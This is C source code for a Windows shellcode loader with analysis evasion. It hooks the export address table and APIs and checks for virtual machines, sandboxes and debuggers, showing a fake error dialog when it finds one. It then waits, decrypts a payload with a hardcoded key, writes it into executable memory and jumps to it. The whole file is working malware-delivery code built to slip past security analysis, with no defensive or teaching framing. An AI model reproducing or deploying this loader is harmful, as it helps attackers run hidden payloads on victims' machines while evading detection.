#include "enhanced_loader.h"
#include <stdio.h>

static ENHANCED_CONFIG g_Config = {0};
static BOOL g_Initialized = FALSE;

BOOL InitializeEnhancedLoader(PENHANCED_CONFIG pConfig) {
    if (g_Initialized) return TRUE;
    
    if (pConfig) {
        memcpy(&g_Config, pConfig, sizeof(ENHANCED_CONFIG));
    } else {
        // Default configuration
        g_Config.enableEATHooking = TRUE;
        g_Config.enableVMDetection = TRUE;
        g_Config.enableSandboxDetection = TRUE;
        g_Config.enableDebuggerDetection = TRUE;
        g_Config.enableAntiAnalysis = TRUE;
        g_Config.delayExecution = 3000; // 3 seconds
        strcpy(g_Config.decryptionKey, "DefaultKey123456789012345678901");
    }
    
    // Initialize EAT hooking if enabled
    if (g_Config.enableEATHooking) {
        if (!InitializeEATHooking()) {
            printf("Warning: Failed to initialize EAT hooking\n");
        }
        
        if (!InitializeAPIHooks()) {
            printf("Warning: Failed to initialize API hooks\n");
        }
    }
    
    g_Initialized = TRUE;
    return TRUE;
}

BOOL CheckAnalysisEnvironment() {
    // Check VM environment
    if (g_Config.enableVMDetection && IsRunningInVM()) {
        return TRUE;
    }
    
    // Check sandbox environment
    if (g_Config.enableSandboxDetection && IsRunningInSandbox()) {
        return TRUE;
    }
    
    // Check debugger
    if (g_Config.enableDebuggerDetection && IsBeingDebugged()) {
        return TRUE;
    }
    
    return FALSE;
}

BOOL ExecutePayloadWithEvasion(PVOID pPayload, DWORD dwPayloadSize) {
    if (!g_Initialized) {
        if (!InitializeEnhancedLoader(NULL)) {
            return FALSE;
        }
    }
    
    // Anti-analysis checks
    if (g_Config.enableAntiAnalysis && CheckAnalysisEnvironment()) {
        // Execute benign decoy behavior
        MessageBoxA(NULL, "Application Error: Cannot initialize component", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Execution delay
    if (g_Config.delayExecution > 0) {
        Sleep(g_Config.delayExecution);
    }
    
    // Decrypt payload
    PVOID pDecrypted = NULL;
    DWORD dwDecryptedSize = 0;
    if (!DecryptPayload(pPayload, dwPayloadSize, g_Config.decryptionKey, &pDecrypted, &dwDecryptedSize)) {
        return FALSE;
    }
    
    // Allocate memory for execution
    PVOID pExecuteMemory = VirtualAlloc(NULL, dwDecryptedSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pExecuteMemory) {
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }
    
    // Copy payload to executable memory
    memcpy(pExecuteMemory, pDecrypted, dwDecryptedSize);
    
    // Execute payload (GCC-compatible version - NO __try)
    BOOL result = FALSE;
    
    // Simple function call instead of __try/__except
    if (pExecuteMemory && dwDecryptedSize > 0) {
        // Jump to payload entry point
        ((void(*)())pExecuteMemory)();
        result = TRUE;
    }
    
    // Cleanup
    VirtualFree(pExecuteMemory, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    
    return result;
}

VOID CleanupEnhancedLoader() {
    if (g_Initialized) {
        if (g_Config.enableEATHooking) {
            CleanupEATHooking();
        }
        g_Initialized = FALSE;
    }
}
